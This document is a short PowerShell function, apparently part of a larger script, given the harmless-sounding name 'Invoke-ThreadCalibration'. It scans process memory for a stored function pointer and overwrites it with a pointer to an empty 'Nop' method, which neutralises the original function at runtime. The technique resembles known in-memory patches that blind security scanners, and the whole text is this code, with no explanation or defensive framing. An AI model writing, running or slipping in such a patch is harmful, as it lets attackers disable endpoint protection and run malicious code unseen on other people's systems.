function Invoke-ThreadCalibration {
    :searchLoop for($j = $startOff; $j -lt $maxOff; $j += $stepOff){
        [IntPtr] $scanPtr = [Int64] $MethodPointer - $j
        $memBuf = [byte[]]::new($bufSize)
        $callRet = [NtHelpers]::ReadMem($Handle, $scanPtr, $memBuf, $bufSize, [ref]$pad)
        for ($i = 0; $i -lt $memBuf.Length; $i += 1) {
            $chunk = [byte[]]($memBuf[$i],$memBuf[$i+1],$memBuf[$i+2],$memBuf[$i+3],$memBuf[$i+4],$memBuf[$i+5],$memBuf[$i+6],$memBuf[$i+7])
            [IntPtr] $val = [bitconverter]::ToInt64($chunk, 0)
            if ($val -eq $funcAddr) {
                Write-Host "OK $j $i"
                [IntPtr] $patchAt = [Int64] $scanPtr + $i
                break searchLoop
            }
        }
    }
    [IntPtr] $hookPtr = [NtHelpers].GetMethod('Nop').MethodHandle.GetFunctionPointer()
    $pArr = [IntPtr[]]($hookPtr)
    [System.Runtime.InteropServices.Marshal]::Copy($pArr, 0, $patchAt, 1)
    Write-Host "$(( (Get-Date) - $InitialDate).TotalSeconds)s"
}
